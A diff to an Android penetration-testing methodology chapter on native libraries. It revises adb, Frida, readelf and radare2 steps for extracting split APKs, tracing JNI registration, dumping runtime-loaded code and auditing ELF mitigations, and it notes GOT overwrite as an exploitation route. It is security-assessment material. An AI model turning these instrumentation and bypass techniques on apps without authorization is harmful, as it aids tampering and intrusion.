@@ -93,7 +93,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 1. **Pull every ABI split and list the `.so` files** (D16-001, D16-002). Native libraries live in
    `split_config.<abi>.apk`, not in `base.apk`; analysing base alone silently deletes this entire chapter
    and produces a false "no native code" negative.
-2. **Build the reachability table before reading a single instruction** (D16-003 → D16-005). `.so` → JNI
+2. **Build the reachability table before reading a single instruction** (D16-003 → D16-005, and D16-061 for
+   code mapped into the process from another package — often the only native parser attacker bytes reach). `.so` → JNI
    entry → the Java caller → where that caller's data comes from → which attacker model can supply it. Every
    later item is scoped by this table; without it you will fuzz code nobody can reach.
 3. **Version-fingerprint the third-party libraries** (D16-006). It costs five minutes and tells you whether
@@ -103,13 +104,22 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
    layers you have to argue past.
 5. **Review the JNI boundary with jnitrace before disassembling anything** (D16-017 → D16-023). The boundary
    shows you the strings, lengths and buffers actually crossing, which is faster than static reversing and
-   catches the dynamically-registered methods.
+   catches the dynamically-registered methods. Every Frida command in this chapter takes `-D "$SERIAL"`; `-U`
+   is never used because the harness normally has a phone and two emulators attached, and the old no-pause flag no
+   longer exists (frida-tools 17 resumes automatically; add `-q -t <seconds>` for scripted runs). Snippets
+   target Frida ≥ 17 (`Process.getModuleByName(m).getExportByName(s)`, `Module.findGlobalExportByName(s)`);
+   the static two-argument `Module.*ExportByName` forms are gone. `-f` spawns a fresh process and kills the
+   running one — on a shared device hold the device for the whole spawn run (one Frida session per device at a
+   time), or attach to the existing pid (`-p $(adb -s "$SERIAL" shell pidof -s "$PKG")`) when another session
+   may hold it; only early-load hooks (D16-004, D16-007) genuinely need spawn. A truncated trace is not "the
+   hook fired N times" and a process that died at spawn is not RASP until you have ruled out a colliding session.
 6. **Hunt the four arithmetic classes first** (D16-024 → D16-027). `int * int`, signed truncation, additive
    wrap, and two-source dimension mismatch account for every worked case in this corpus. They are cheap to
    grep for and they are where the Criticals are.
-7. **Drive the reachable entry point and capture a tombstone** (D16-035, D16-048). The tombstone is the
-   artefact that changes the VRT category. No tombstone, no memory-safety finding.
-8. **Only then fuzz** (D16-043 → D16-047). Fuzzing is the expensive option and it is worthless if the
+7. **Drive the reachable entry point and capture a tombstone** (D16-035, D16-049). The tombstone is the
+   artefact that changes the VRT category. No tombstone, no memory-safety finding — and read the platform's
+   free sanitizer verdict in it (D16-063) before building any harness.
+8. **Only then fuzz** (D16-044 → D16-047, or D16-064 for ASan on the app's own caller path). Fuzzing is the expensive option and it is worthless if the
    harness calls an entry point no real caller reaches (D16-045).
 9. **Run the mitigation reality check before writing severity** (D16-053 → D16-060). Name the layer that
    stopped you. "Arbitrary write → RCE" without that paragraph is the most-downgraded claim in mobile
@@ -125,6 +135,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **VRT** | n/a (enabler; a missed split is a false negative across the whole chapter) |
 | **Attacker** | n/a (acquisition) |
 | **Applies to** | all app-bundle-delivered apps, i.e. effectively every Play-distributed app |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0157 (Extracting Bundled Native Libraries); MASWE-0045 |
 
 - **Test:** Confirm you hold `base.apk` **and every** `split_config.*`. Native libraries are packaged into
@@ -132,18 +143,26 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   app that ships twelve `.so` files.
 - **How:**
   ```bash
-  PKG=com.target.app
-  mkdir -p work/apk && cd work/apk
-  for p in $(adb shell pm path $PKG | sed 's/package://' | tr -d '\r'); do adb pull "$p" .; done
+  mkdir -p "$E/apk" && cd "$E/apk"
+  for p in $(adb -s "$SERIAL" shell pm path "$PKG" | sed 's/package://' | tr -d '\r'); do adb -s "$SERIAL" pull "$p" .; done
   shasum -a 256 *.apk                       # artefact identity — record this in the report
   for a in *.apk; do echo "== $a"; unzip -l "$a" | grep '\.so$'; done
   # third-party mirror acquisition: verify the download is not truncated before believing an empty result
   file base.apk; wc -c < base.apk
-  unzip -o base.apk -d x/ || 7z x -y base.apk -o"x"     # 7z recovers entries unzip rejects
+  # the library root every D16 item reads: apktool decodes base only, so unpack lib/ from EVERY apk in the set
+  LIBS="$DEC/libs"; mkdir -p "$LIBS"
+  for a in "$E"/apk/*.apk; do unzip -o -q "$a" 'lib/*' -d "$LIBS" 2>/dev/null || 7z x -y "$a" 'lib/*' -o"$LIBS" >/dev/null; done   # 7z recovers entries unzip rejects
+  find "$LIBS" -name '*.so' | wc -l
+  # ELF tooling, host-neutral: GNU binutils on Linux, llvm on macOS (brew install llvm | apt install binutils); set once per shell
+  READELF=${READELF:-$(command -v readelf || command -v llvm-readelf || command -v greadelf || ls /opt/homebrew/opt/llvm*/bin/llvm-readelf 2>/dev/null | head -1)}
+  NM=${NM:-$(command -v llvm-nm || command -v nm)}; OBJDUMP=${OBJDUMP:-$(command -v llvm-objdump || command -v objdump)}
+  [ -x "$READELF" ] || { echo 'no ELF readelf on this host — brew install llvm | apt install binutils'; exit 2; }
   # and check how the libraries are packaged
-  grep -n 'extractNativeLibs' x/AndroidManifest.xml 2>/dev/null || \
+  grep -n 'extractNativeLibs' "$DEC/apktool/AndroidManifest.xml" 2>/dev/null || \
     aapt2 dump xmltree base.apk --file AndroidManifest.xml | grep -i extractNativeLibs
   ```
+  Every later `How` in this chapter assumes `$LIBS`, `$READELF`/`$NM`/`$OBJDUMP` and `$DEC` from this block,
+  and `$SRC` (the upstream source checkout of a fingerprinted library) from D16-024.
 - **Proof:** `pm path` prints ≥2 lines and your local directory holds the same count; `.so` names appear in
   the ABI split listing and are absent from `base.apk`. Record the per-file SHA-256 set — that is the
   artefact identity every later finding is anchored to.
@@ -151,7 +170,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   `libapp.so` / Hermes), and every item below. A library that exists **only** in a split is a common
   blind spot — nobody else reviewed it.
 - **Ruled out when:** `pm path` returns exactly one path, `unzip -l` on it shows no `lib/` entries, and
-  `adb shell cat /proc/<pid>/maps | grep -c '/data/app.*\.so'` returns 0 at runtime after exercising the
+  `adb -s "$SERIAL" shell cat /proc/<pid>/maps | grep -c '/data/app.*\.so'` returns 0 at runtime after exercising the
   app's main flows — i.e. the app genuinely has no native code of its own and loads none. A silent tool is
   not enough; you need the runtime map check (D16-002) as well.
 
@@ -163,6 +182,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **VRT** | n/a standalone; the hidden code's behaviour decides the path (→ D17) |
 | **Attacker** | AM-12 for the dump itself (evidence tool); the finding is about what the hidden code does |
 | **Applies to** | packed/protected apps, apps with commercial RASP, apps with plugin SDKs |
+| **Requires** | device, frida |
 | **Maps to** | MASTG-TECH-0029 (Listing Loaded Native Libraries), MASTG-TOOL-0001; ATT&CK T1407, T1575 |
 
 - **Test:** Packers and some SDKs decrypt a `.so` at runtime and map it from memory or a `memfd`, so it never
@@ -170,17 +190,21 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   *shipped*.
 - **How:**
   ```bash
-  PID=$(adb shell pidof com.target.app)
-  adb shell cat /proc/$PID/maps | grep -E '\.so|memfd:|r-xp' | awk '{print $6}' | sort -u > runtime.txt
-  unzip -l base.apk split_config.*.apk | grep -oE 'lib/[^ ]*\.so' | sort -u > shipped.txt
-  comm -23 runtime.txt shipped.txt          # loaded but not shipped
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG")
+  # loaded: app-owned or anonymous ELF mappings only, by basename (system/apex/vendor paths are the platform, not the app)
+  adb -s "$SERIAL" shell cat /proc/$PID/maps | awk '$6 ~ /\.so|memfd:/ {print $6}' \
+    | grep -vE '^/(system|apex|vendor|product|system_ext)/' | sed 's/.*!//' | xargs -n1 basename | sort -u > runtime.txt
+  # shipped: every APK in the set, by basename (unzip takes ONE archive — loop, never `unzip -l a.apk b.apk`)
+  for a in "$E"/apk/*.apk; do unzip -l "$a"; done | grep -oE 'lib/[^ ]*\.so' | xargs -n1 basename | sort -u > shipped.txt
+  comm -23 runtime.txt shipped.txt          # loaded but not shipped (memfd:, /data/data paths, foreign packages → D16-061)
+  adb -s "$SERIAL" shell cat /proc/$PID/maps | grep -E 'memfd:|anon:dalvik-|/data/data|/data/user' | grep -E 'r.xp' | head   # anonymous executable code
   ```
   Catch the load itself and dump it:
   ```bash
-  frida-trace -U -n com.target.app -i 'libc.so!memfd_create' -i 'libdl.so!android_dlopen_ext' -i 'libc.so!mmap'
+  frida-trace -D "$SERIAL" -n "$PKG" -i 'libc.so!memfd_create' -i 'libdl.so!android_dlopen_ext' -i 'libc.so!mmap'
   # or sweep and stream every mapped ELF back:
   git clone https://github.com/TheQmaks/sosaver && cd sosaver && uv sync && source .venv/bin/activate
-  sosaver com.target.app -o /tmp/so-dumps --debug
+  sosaver "$PKG" -o "$E/logs/so-dumps" --debug
   ```
 - **Proof:** A reconstructed ELF from an anonymous or `memfd:` mapping that `readelf -h` parses and that does
   not exist anywhere in the APK set; or a `comm -23` line naming a module path under `/data/` that is absent
@@ -209,18 +233,17 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   length of data it receives.
 - **How:**
   ```bash
-  unzip -o base.apk 'lib/*' -d libs/ ; unzip -o split_config.arm64_v8a.apk 'lib/*' -d libs/
-  for so in libs/lib/*/*.so; do
+  for so in "$LIBS"/lib/*/*.so; do                       # $LIBS from D16-001 (base AND every split)
     echo "== $so"
     nm -D --defined-only "$so" 2>/dev/null | grep ' T Java_'
     objdump -T "$so" 2>/dev/null | grep -E 'Java_|JNI_OnLoad'
   done
-  rabin2 -s libs/lib/arm64-v8a/libtarget.so | grep JNI          # MASTG-TOOL-0129
-  r2 -A libs/lib/arm64-v8a/libtarget.so                          # then:  is~JNI
+  rabin2 -s "$LIBS"/lib/arm64-v8a/libtarget.so | grep JNI       # MASTG-TOOL-0129
+  r2 -A "$LIBS"/lib/arm64-v8a/libtarget.so                       # then:  is~JNI
   # bind each export back to its Java declaration
-  jadx -d out base.apk
-  grep -rn '\bnative\b .*(' out/sources/ | grep -vE '^\s*//' | head -60
-  grep -rn 'System.loadLibrary\|System.load(' out/sources/
+  # the decompiled tree is $DEC/jadx (P3); do not re-run jadx into a second tree
+  grep -rn '\bnative\b .*(' "$DEC/jadx/sources" | grep -vE '^\s*//' | head -60
+  grep -rn 'System.loadLibrary\|System.load(' "$DEC/jadx/sources"
   ```
 - **Proof:** A table with one row per export: `libtarget.so : Java_com_target_Codec_decode` ↔
   `com.target.Codec.decode(byte[], int, int)` ↔ declared in `Codec.java:41`. The two `int` parameters next to
@@ -247,16 +270,22 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   "no JNI surface" on an app with a large one. Dump the `JNINativeMethod` table at runtime.
 - **How:**
   ```bash
-  strings -a libs/lib/arm64-v8a/libtarget.so | grep -n 'RegisterNatives'
-  frida-trace -U -f com.target.app -i 'RegisterNatives' -i 'JNI_OnLoad' -i 'dlopen*'
+  strings -a "$LIBS"/lib/arm64-v8a/libtarget.so | grep -n 'RegisterNatives'
+  # RegisterNatives is a JNIEnv table entry, not an export: trace the loaders here and hook the ART symbol below
+  frida-trace -D "$SERIAL" -f "$PKG" -i 'JNI_OnLoad' -i 'dlopen*' -i 'android_dlopen_ext'
   ```
   Read the struct array directly — `JNINativeMethod` is `{const char* name; const char* signature; void* fnPtr;}`,
   so 3 pointers per entry:
   ```javascript
-  // frida -D "$SERIAL" -f com.target.app -l regnatives.js
-  const RN = Module.getExportByName(null, 'RegisterNatives') ||
-             Module.findExportByName('libart.so', '_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi');
-  Interceptor.attach(RN, {
+  // frida -D "$SERIAL" -f "$PKG" -l regnatives.js -q -t 120        # spawn: libraries register at load, so a late attach misses them
+  // attach alternative on a shared device (another session may hold it): frida -D "$SERIAL" -p "$PID" -l regnatives.js -q -t 120
+  //   — only methods registered AFTER the attach are seen; already-registered ones need the spawn run
+  // Frida ≥ 17: the symbol is ART's templated JNI<bool>::RegisterNatives (_ZN3art3JNIILb0EE15RegisterNatives… / ILb1EE), not an export
+  const art = Process.getModuleByName('libart.so');
+  const targets = art.enumerateSymbols().filter(s => s.name.includes('RegisterNatives') && !s.name.includes('CheckJNI'));
+  if (!targets.length) throw new Error('no RegisterNatives symbol in libart — dump the JNIEnv table instead');
+  targets.forEach(t => console.log('[hooking] ' + t.name));
+  targets.forEach(t => Interceptor.attach(t.address, {
     onEnter(a) {
       const cls = a[1], arr = a[2], n = a[3].toInt32();
       const ptrSize = Process.pointerSize;
@@ -268,15 +297,16 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
                     '  @ ' + DebugSymbol.fromAddress(base.add(2 * ptrSize).readPointer()));
       }
     }
-  });
+  }));
   ```
   Cross-check with the boundary trace, which sees every call regardless of how it was bound:
   ```bash
-  pip install jnitrace
-  jnitrace -l libtarget.so com.target.app
+  pip install jnitrace        # pinned venv + Frida-17 fallback: see D16-017
+  jnitrace -l libtarget.so "$PKG"
   ```
 - **Proof:** A printed method table — name, JNI signature, and the resolved function address in
-  `libtarget.so` — for methods that do not appear in `nm -D` output. The signature string
+  `libtarget.so` — for methods that do not appear in `nm -D` output, plus the `[hooking]` line naming the ART
+  symbol actually hooked (it differs per ART version). The signature string
   (`([BII)Ljava/lang/String;`) tells you the parameter types without decompiling anything.
 - **Escalation:** Each recovered method joins D16-005. A dynamically registered method is *more* interesting
   than a statically bound one, because it was hidden and because the developers thought it was hidden.
@@ -302,7 +332,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:** Take the export list from D16-003/D16-004 and trace each Java declaration's callers backwards to
   a source.
   ```bash
-  S=out/sources
+  S="$DEC/jadx/sources"
   for m in decode parse load init verify sign; do
     echo "== $m"; grep -rn "\.$m(" $S | grep -vE '^\S+/(android|androidx|kotlin|com/google/android)/' | head
   done
@@ -314,7 +344,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   ```
   Confirm at runtime that your bytes really arrive:
   ```javascript
-  Interceptor.attach(Module.getExportByName('libtarget.so', 'Java_com_target_Codec_decode'), {
+  Interceptor.attach(Process.getModuleByName('libtarget.so').getExportByName('Java_com_target_Codec_decode'), {   // Frida ≥ 17 form
     onEnter(a) { console.log('[JNI] decode len=' + a[4].toInt32() + ' first8=' + hexdump(a[3], {length: 8})); }
   });
   ```
@@ -340,21 +370,22 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Requires** | native |
 | **Maps to** | MASWE-0044 (Dependencies with Known Vulnerabilities, CWE-1395/CWE-1357); VRT `using_components_with_known_vulnerabilities`; LibRARIAN version-identification methodology |
 
-- **Test:** Native libraries are the least-patched part of an Android app and are invisible to dependency
+- **Test:** **Owner: D17-062** (the per-`.so` version fingerprint, same regex set); run it once there and
+  consume the table here — this item adds the reachability and escalation reading. Native libraries are the
+  least-patched part of an Android app and are invisible to dependency
   scanners. Recover each bundled library's version from its own strings and ELF metadata, then check it
   against advisories — and stop there until you have a reachable path.
 - **How:** The LibRARIAN regex set, which is what actually matches real `.rodata` version banners:
   ```bash
-  unzip -o base.apk 'lib/*' -d x; unzip -o split_config.*.apk 'lib/*' -d x
-  for so in $(find x/lib -name '*.so'); do
+  for so in $(find "$LIBS" -name '*.so'); do               # $LIBS from D16-001
     echo "=== $so"
     strings -a "$so" | grep -aoE 'ffmpeg-([0-9]\.)*[0-9]|openssl-1(\.[0-9])*[a-z]|OpenSSL 1\.[0-9]\.[0-9][a-z]?|^3\.([0-9]{1,}\.)+[0-9]|libpng version [0-9.]+|libjpeg-turbo [0-9.]+|zlib [0-9.]+|libxml2-[0-9.]+|GIFLIB [0-9.]+|WebP [0-9.]+' | sort -u
-    readelf -d "$so" | grep -E 'NEEDED|SONAME'
-    readelf -pcomment "$so" 2>/dev/null | head -3       # toolchain/NDK identity
-    sha256sum "$so"
+    $READELF -d "$so" | grep -E 'NEEDED|SONAME'
+    $READELF -pcomment "$so" 2>/dev/null | head -3      # toolchain/NDK identity
+    shasum -a 256 "$so"
   done
   # WebRTC/video SDKs carry their own banner form
-  strings -a x/lib/*/libjingle_peerconnection_so.so 2>/dev/null | \
+  strings -a "$LIBS"/lib/*/libjingle_peerconnection_so.so 2>/dev/null | \
     grep -aoE 'WebRTC/M[0-9]+|branch-heads/[0-9]+|[0-9]{5,}\.[0-9]+\.[0-9]+' | sort -u
   ```
 - **Proof:** A table of `.so path | library | version string | matching advisory`, with the raw `strings`
@@ -393,14 +424,14 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   the library loads.
 - **How:**
   ```bash
-  readelf -d libs/lib/arm64-v8a/libtarget.so | grep -E 'INIT_ARRAY|INIT\b|FINI_ARRAY'
-  readelf -x .init_array libs/lib/arm64-v8a/libtarget.so
-  readelf -r libs/lib/arm64-v8a/libtarget.so | grep -i relative | head        # constructor addrs land here
-  objdump -T libs/lib/arm64-v8a/libtarget.so | grep JNI_OnLoad
+  $READELF -d "$LIBS"/lib/arm64-v8a/libtarget.so | grep -E 'INIT_ARRAY|INIT\b|FINI_ARRAY'
+  $READELF -x .init_array "$LIBS"/lib/arm64-v8a/libtarget.so
+  $READELF -r "$LIBS"/lib/arm64-v8a/libtarget.so | grep -i relative | head        # constructor addrs land here
+  $OBJDUMP -T "$LIBS"/lib/arm64-v8a/libtarget.so | grep JNI_OnLoad
   ```
   Observe them at runtime, and get control if they block you:
   ```bash
-  frida-trace -U -f com.target.app -i 'JNI_OnLoad' -i 'android_dlopen_ext'
+  frida-trace -D "$SERIAL" -f "$PKG" -i 'JNI_OnLoad' -i 'android_dlopen_ext'   # spawn is required: constructors run at load (attach with -p sees nothing)
   ```
   To regain early instrumentation on an ARM64 ELF: locate the `.init_array` VA range, compute the constructor
   address from the RELATIVE relocation landing in it, remove the auto-run tags so the loader skips
@@ -431,37 +462,39 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **Test:** The mitigation timeline is per-release **and** per-NDK. An app's own `.so` built with an old NDK
   can lack PIE, RELRO or NX on a fully patched device. Read the state off each binary; never infer it from
   the device's OS version.
-- **How:** The whole sweep, per library:
+- **How:** The whole sweep, per library (`$READELF` resolved in D16-001: GNU `readelf` on Linux, `llvm-readelf`
+  on macOS — bare `readelf` does not exist there and the sweep silently prints nothing):
   ```bash
-  readelf -h  lib.so | grep Type:              # DYN = PIE/randomised · EXEC = fixed base
-  readelf -lW lib.so | grep GNU_STACK          # RW = NX enforced · RWE (or absent) = executable data
-  readelf -lW lib.so | grep GNU_RELRO          # GNU_RELRO segment present?
-  readelf -d  lib.so | grep -E 'BIND_NOW|FLAGS' # BIND_NOW/NOW as well => FULL RELRO (read-only GOT)
-  readelf -sW lib.so | grep -c __stack_chk_fail # 0 = no canary references
-  readelf -sW lib.so | grep -E '_chk$|_FORTIFY' # FORTIFY: __memcpy_chk, __sprintf_chk, ...
-  execstack -q lib.so                           # '-' = NX · 'X' = exec stack · '?' = unmarked
+  $READELF -h  lib.so | grep Type:              # DYN = PIE/randomised · EXEC = fixed base
+  $READELF -lW lib.so | grep GNU_STACK          # RW = NX enforced · RWE (or absent) = executable data — this row IS the NX answer
+  $READELF -lW lib.so | grep GNU_RELRO          # GNU_RELRO segment present?
+  $READELF -d  lib.so | grep -E 'BIND_NOW|FLAGS' # BIND_NOW/NOW as well => FULL RELRO (read-only GOT)
+  $READELF -sW lib.so | grep -c __stack_chk_fail # 0 = no canary references
+  $READELF -sW lib.so | grep -E '_chk$|_FORTIFY' # FORTIFY: __memcpy_chk, __sprintf_chk, ...
   rabin2 -I lib.so                              # one-line summary: canary/pic/nx/relro/stripped
-  checksec --file=lib.so
+  pwn checksec lib.so                           # pwntools, pure Python, runs on both hosts (the bash `checksec` needs GNU readelf)
   ```
   **Do not write this as a shell array loop.** Shell loops over computed lists fail silently — an
   unpopulated array produces zero iterations with no error and output that looks complete. Drive it from
   Python with per-iteration logging and an explicit count:
   ```python
   #!/usr/bin/env python3
-  import glob, subprocess, json, sys
-  libs = sorted(glob.glob('x/lib/*/*.so'))
+  import glob, os, shutil, subprocess, json, sys
+  READELF = os.environ.get('READELF') or shutil.which('readelf') or shutil.which('llvm-readelf') or shutil.which('greadelf')
+  assert READELF, 'no readelf on this host: brew install llvm | apt install binutils'
+  libs = sorted(glob.glob(os.path.join(os.environ['DEC'], 'libs', 'lib', '*', '*.so')))
   print(f'[i] {len(libs)} libraries to audit', file=sys.stderr)
   rows = []
   for i, so in enumerate(libs, 1):
       row = {'lib': so}
       try:
-          row['type']   = 'DYN' if b'DYN' in subprocess.run(['readelf','-h',so],capture_output=True).stdout else 'EXEC'
-          lw            = subprocess.run(['readelf','-lW',so],capture_output=True).stdout.decode('utf8','replace')
+          row['type']   = 'DYN' if b'DYN' in subprocess.run([READELF,'-h',so],capture_output=True).stdout else 'EXEC'
+          lw            = subprocess.run([READELF,'-lW',so],capture_output=True).stdout.decode('utf8','replace')
           row['relro']  = 'GNU_RELRO' in lw
           row['nx']     = ('RWE' not in [l for l in lw.splitlines() if 'GNU_STACK' in l][0]) if 'GNU_STACK' in lw else False
-          d             = subprocess.run(['readelf','-d',so],capture_output=True).stdout.decode('utf8','replace')
+          d             = subprocess.run([READELF,'-d',so],capture_output=True).stdout.decode('utf8','replace')
           row['bindnow']= 'BIND_NOW' in d or 'NOW' in d
-          s             = subprocess.run(['readelf','-sW',so],capture_output=True).stdout.decode('utf8','replace')
+          s             = subprocess.run([READELF,'-sW',so],capture_output=True).stdout.decode('utf8','replace')
           row['canary'] = s.count('__stack_chk_fail')
           row['fortify']= len([l for l in s.splitlines() if l.rstrip().endswith('_chk')])
       except Exception as e:
@@ -472,10 +505,11 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   ```
   Then confirm the runtime side on the test device:
   ```bash
-  adb shell cat /proc/self/maps | grep -E '(stack|heap)'        # look for rwxp
-  adb shell cat /proc/sys/kernel/randomize_va_space             # 0 none · 1 all-but-heap · 2 full
-  adb shell cat /proc/sys/vm/mmap_min_addr
-  adb shell cat /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG")                 # /proc/self is the adb shell's own cat, not the app
+  adb -s "$SERIAL" shell cat /proc/$PID/maps | grep -E 'rwxp|\[stack\]|\[heap\]|scudo'
+  adb -s "$SERIAL" shell cat /proc/sys/kernel/randomize_va_space             # 0 none · 1 all-but-heap · 2 full
+  adb -s "$SERIAL" shell cat /proc/sys/vm/mmap_min_addr
+  adb -s "$SERIAL" shell cat /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
   ```
 - **Proof:** The JSON row set, quoted per library in the report appendix, with the count line proving no
   library was skipped. The reference NDK timeline for reading a result: stack cookies since **r1**,
@@ -503,9 +537,9 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   no shellcode, no ROP, and portable across builds.
 - **How:**
   ```bash
-  readelf -lW lib.so | grep GNU_RELRO        # present?
-  readelf -d  lib.so | grep -E 'BIND_NOW|FLAGS.*NOW'   # absent => PARTIAL RELRO
-  readelf -r  lib.so | grep -E 'JUMP_SLOT'   # the entries that stay writable
+  $READELF -lW lib.so | grep GNU_RELRO        # present?
+  $READELF -d  lib.so | grep -E 'BIND_NOW|FLAGS.*NOW'   # absent => PARTIAL RELRO
+  $READELF -r  lib.so | grep -E 'JUMP_SLOT'   # the entries that stay writable
   # confirm at runtime which mapping holds the GOT and its permissions
   adb shell cat /proc/$(adb shell pidof com.target.app)/maps | grep libtarget.so
   ```
@@ -533,18 +567,26 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Requires** | native |
 | **Maps to** | MASTG-TEST-0222 (Position Independent Code (PIC) Not Enabled — frontmatter `deprecated_since: 21`), MASTG-TECH-0115, MASWE-0045; MASVS-CODE-3 |
 
-- **Test:** Check the ELF type on every shipped library. On a modern build a non-PIE result is almost never
-  an exploitability finding — it is a **provenance signal** that somebody vendored a prebuilt binary built by
-  a toolchain nobody in the project controls.
+- **Test:** A `.so` with `Type: EXEC` will not load at all — bionic's linker refuses any `e_type != ET_DYN`
+  (`dlopen failed: "…" has unexpected e_type: 2`) — so if you see one, the app never `dlopen`s it: it is either
+  dead weight or an **executable** shipped under `lib/<abi>/lib*.so` or `assets/` that the app copies and
+  `exec()`s (media transcoders, busybox-style helpers, tunnelling binaries). Those must be PIE on API 21+ or
+  they fail with `only position independent executables (PIE) are supported`; the finding is then the exec
+  path itself (D16-021 / D17), not the mitigation. On a modern build the result is otherwise a **provenance
+  signal** that somebody vendored a prebuilt binary built by a toolchain nobody in the project controls.
 - **How:**
   ```bash
-  for so in x/lib/*/*.so; do printf '%s ' "$so"; readelf -h "$so" | awk '/Type:/{print $2}'; done
+  for so in "$LIBS"/lib/*/*.so; do printf '%s ' "$so"; $READELF -h "$so" | awk '/Type:/{print $2}'; done
   # DYN = position independent · EXEC = fixed load base
-  rabin2 -I x/lib/arm64-v8a/libfoo.so | grep -E 'pic|pie'
-  readelf -pcomment x/lib/arm64-v8a/libfoo.so 2>/dev/null | head -3   # which toolchain built it?
+  rabin2 -I "$LIBS"/lib/arm64-v8a/libfoo.so | grep -E 'pic|pie'
+  $READELF -pcomment "$LIBS"/lib/arm64-v8a/libfoo.so 2>/dev/null | head -3   # which toolchain built it?
+  # the live case: an EXECUTABLE shipped under lib/<abi>/ or assets/ that the app copies and exec()s
+  for f in "$LIBS"/lib/*/*.so "$DEC"/apktool/assets/*; do $READELF -h "$f" 2>/dev/null | awk -v f="$f" '/Type:/{print f, $2}'; done | grep EXEC
+  grep -rnE 'ProcessBuilder|Runtime\.getRuntime\(\)\.exec|setExecutable\(true' "$DEC/jadx/sources"
   ```
-- **Proof:** `Type: EXEC` on a shipped `.so`, alongside a `.comment` section naming a different compiler
-  from the rest of the app's libraries.
+- **Proof:** `Type: EXEC` on a shipped file, alongside the `exec()` call site that runs it (`file:line`) — or,
+  for a never-loaded `.so`, a `.comment` section naming a different compiler from the rest of the app's
+  libraries.
 - **Escalation:** → D17 supply chain. A non-PIE, differently-toolchained library is a prebuilt third-party
   binary: identify it (D16-006), because it is very likely also unpatched. Historically, a fixed load base
   removed the need for an information leak entirely — up to Android 4.0 the dynamic linker itself sat at a fixed base (`0xb0001000`)
@@ -568,10 +610,10 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   domain.
 - **How:**
   ```bash
-  for so in x/lib/arm64-v8a/*.so; do
-    printf '%s canary_refs=%s\n' "$so" "$(readelf -sW "$so" | grep -c '__stack_chk_fail')"
+  for so in "$LIBS"/lib/arm64-v8a/*.so; do
+    printf '%s canary_refs=%s\n' "$so" "$($READELF -sW "$so" | grep -c '__stack_chk_fail')"
   done
-  rabin2 -I x/lib/arm64-v8a/libnative-lib.so | grep -E 'canary'
+  rabin2 -I "$LIBS"/lib/arm64-v8a/libnative-lib.so | grep -E 'canary'
   ```
   **The exclusions, from MASTG-TEST-0223 itself:**
   1. **Flutter** does not use stack canaries — Dart mitigates buffer overflows differently. `libflutter.so`
@@ -606,7 +648,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   binary; you read the **imported symbols it produced**.
 - **How:**
   ```bash
-  for so in x/lib/*/*.so; do
+  for so in "$LIBS"/lib/*/*.so; do
     echo "== $so"
     nm -D "$so" 2>/dev/null | grep -E ' U __(memcpy|memmove|memset|strcpy|strncpy|strcat|sprintf|snprintf|vsprintf|read|poll|fgets)_chk'
     nm -D "$so" 2>/dev/null | grep -cE ' U (memcpy|strcpy|strcat|sprintf|gets)$'   # unfortified sinks
@@ -640,15 +682,14 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   `mprotect`s its own code?
 - **How:**
   ```bash
-  readelf -lW lib.so | grep -A1 GNU_STACK
-  execstack -q lib.so                          # '-' NX · 'X' exec stack · '?' unmarked
-  PID=$(adb shell pidof com.target.app)
-  adb shell cat /proc/$PID/maps | grep rwxp
+  $READELF -lW lib.so | grep -A1 GNU_STACK     # RWE or absent = executable stack (execstack(8) is unmaintained; this row answers it)
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG")
+  adb -s "$SERIAL" shell cat /proc/$PID/maps | grep rwxp
   ```
   Watch for a library creating one:
   ```javascript
   ['mmap','mprotect'].forEach(function (n) {
-    var f = Module.findExportByName(null, n);
+    var f = Module.findGlobalExportByName(n);   // Frida ≥ 17 form
     if (f) Interceptor.attach(f, { onEnter(a) { console.log(n + ' len=' + a[1] + ' prot=' + a[2]); } });
   });
   ```
@@ -716,15 +757,15 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   specific symbol or embedded path *reveals*.
 - **How:**
   ```bash
-  for so in x/lib/*/*.so; do
+  for so in "$LIBS"/lib/*/*.so; do
     echo "== $so"
-    readelf -S "$so" | grep -E '\.debug_|\.symtab'
+    $READELF -S "$so" | grep -E '\.debug_|\.symtab'
     nm -C "$so" 2>/dev/null | head -40
     diff <(nm "$so" 2>/dev/null) <(nm -a "$so" 2>/dev/null) | head    # empty => stripped
     rabin2 -s "$so" | head
   done
-  r2 -A x/lib/arm64-v8a/libnative-lib.so     # then:  i~stripped,linenum,lsyms
-  strings -a x/lib/*/*.so | grep -E '\.c$|\.cpp$|/home/|/Users/|/build/|/jenkins/|\.internal\.' | sort -u | head -30
+  r2 -A "$LIBS"/lib/arm64-v8a/libnative-lib.so     # then:  i~stripped,linenum,lsyms
+  strings -a "$LIBS"/lib/*/*.so | grep -E '\.c$|\.cpp$|/home/|/Users/|/build/|/jenkins/|\.internal\.' | sort -u | head -30
   ```
 - **Proof:** `stripped false` / `lsyms true` in radare2's `i` output, or a populated `SYMBOL TABLE` from
